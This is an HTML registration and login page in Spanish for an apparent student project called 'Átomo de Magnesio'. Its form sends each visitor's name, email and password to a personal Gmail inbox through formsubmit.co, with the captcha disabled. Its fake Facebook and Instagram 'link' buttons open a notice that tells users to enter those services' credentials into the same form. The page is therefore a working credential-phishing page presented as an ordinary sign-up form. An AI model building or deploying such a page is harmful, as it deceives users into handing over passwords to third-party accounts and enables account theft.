<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Átomo de Magnesio</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #020810 0%, #0a1630 100%);
            font-family: 'Share Tech Mono', monospace;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #c8e8ff;
        }
        
        .login-container {
            background: rgba(5, 18, 38, 0.95);
            border: 1px solid rgba(0, 200, 255, 0.3);
            border-radius: 12px;
            padding: 40px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 0 50px rgba(0, 200, 255, 0.1);
            backdrop-filter: blur(10px);
            position: relative;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .login-header h1 {
            font-size: 2rem;
            color: #00c8ff;
            text-shadow: 0 0 20px rgba(0, 200, 255, 0.5);
            margin-bottom: 8px;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 2px;
        }
        
        .login-header p {
            color: #4a7a9b;
            font-size: 0.85rem;
            letter-spacing: 1px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 0.8rem;
            color: #00c8ff;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(0, 200, 255, 0.2);
            background: rgba(0, 200, 255, 0.05);
            color: #c8e8ff;
            border-radius: 6px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.9rem;
            transition: all 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #00c8ff;
            box-shadow: 0 0 15px rgba(0, 200, 255, 0.3);
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #00c8ff 0%, #00a8cc 100%);
            border: none;
            color: #020810;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 5px rgba(0, 200, 255, 0.3);
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 25px rgba(0, 200, 255, 0.5);
        }

        .social-divider {
            margin: 25px 0;
            text-align: center;
            border-bottom: 1px solid rgba(0, 200, 255, 0.1);
            line-height: 0.1em;
        }

        .social-divider span {
            background: #051226;
            padding: 0 10px;
            color: #4a7a9b;
            font-size: 0.7rem;
        }

        .social-group {
            display: flex;
            gap: 10px;
            margin-bottom: 10px;
        }

        .social-btn {
            flex: 1;
            padding: 10px;
            background: rgba(0, 200, 255, 0.05);
            border: 1px solid rgba(0, 200, 255, 0.2);
            color: #00c8ff;
            border-radius: 6px;
            font-family: 'Orbitron', sans-serif;
            font-size: 0.7rem;
            cursor: pointer;
            transition: all 0.3s;
        }

        .social-btn:hover {
            background: rgba(0, 200, 255, 0.15);
            border-color: #00c8ff;
            box-shadow: 0 0 10px rgba(0, 200, 255, 0.2);
        }
        
        .back-link {
            text-align: center;
            margin-top: 20px;
        }
        
        .back-link a {
            color: #00c8ff;
            text-decoration: none;
            font-size: 0.8rem;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        
        .back-link a:hover {
            text-shadow: 0 0 10px rgba(0, 200, 255, 0.5);
        }

        /* NOTIFICACIÓN EN PANTALLA (MODAL) */
        .custom-notice {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(2, 8, 16, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .notice-content {
            background: #051226;
            border: 2px solid #00c8ff;
            padding: 30px;
            border-radius: 8px;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 0 30px rgba(0, 200, 255, 0.3);
        }

        .notice-content h3 {
            font-family: 'Orbitron', sans-serif;
            color: #00c8ff;
            margin-bottom: 15px;
            letter-spacing: 1px;
        }

        .notice-content p {
            font-size: 0.9rem;
            line-height: 1.5;
            color: #c8e8ff;
            margin-bottom: 20px;
        }

        .notice-btn {
            padding: 10px 20px;
            background: #00c8ff;
            border: none;
            color: #020810;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <!-- Ventana de aviso que aparecerá al pulsar redes sociales -->
    <div id="noticeModal" class="custom-notice">
        <div class="notice-content">
            <h3 id="noticeTitle">CONEXIÓN VIRTUAL</h3>
            <p id="noticeMessage">Mensaje por defecto.</p>
            <button class="notice-btn" onclick="cerrarAviso()">Entendido</button>
        </div>
    </div>

    <div class="login-container">
        <div class="login-header">
            <h1>⚛ ACCESO</h1>
            <p>ÁTOMO DE MAGNESIO</p>
        </div>
        
        <!-- Formulario principal conectado a tu correo -->
        <form action="https://formsubmit.co/frayvictoria0@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://frayvictorialugo.github.io/Fray-2005-VL/">
            <input type="hidden" name="_captcha" value="false"> 

            <div class="form-group">
                <label for="nombre">Nombre Completo</label>
                <input type="text" id="nombre" name="Nombre" required placeholder="Tu nombre">
            </div>

            <div class="form-group">
                <label for="email">Correo Electrónico</label>
                <input type="email" id="email" name="Email" required placeholder="tu@correo.com">
            </div>
            
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="Contraseña" required placeholder="••••••••">
            </div>
            
            <button type="submit" class="login-btn">Registrarse</button>
        </form>

        <div class="social-divider">
            <span>O ENLAZAR CON</span>
        </div>

        <div class="social-group">
            <button type="button" class="social-btn" onclick="mostrarAviso('Facebook')">FACEBOOK</button>
            <button type="button" class="social-btn" onclick="mostrarAviso('Instagram')">INSTAGRAM</button>
        </div>
        
        <div class="back-link">
            <a href="https://frayvictorialugo.github.io/Fray-2005-VL/">← Volver al Proyecto</a>
        </div>
    </div>
    
    <script>
        // Función para abrir la alerta interna personalizada
        function mostrarAviso(red) {
            const modal = document.getElementById('noticeModal');
            const title = document.getElementById('noticeTitle');
            const msg = document.getElementById('noticeMessage');
            
            title.innerText = `⚛ SINCRONIZACIÓN CON ${red.toUpperCase()}`;
            msg.innerText = `Para vincular tu cuenta de ${red} al Sistema de Control del Magnesio, por favor introduce tus credenciales de acceso directamente en el formulario principal de registro.`;
            
            modal.style.display = 'flex';
        }

        // Función para cerrar el aviso y dejarlos en el formulario principal
        function cerrarAviso() {
            document.getElementById('noticeModal').style.display = 'none';
        }
    </script>
</body>
</html>
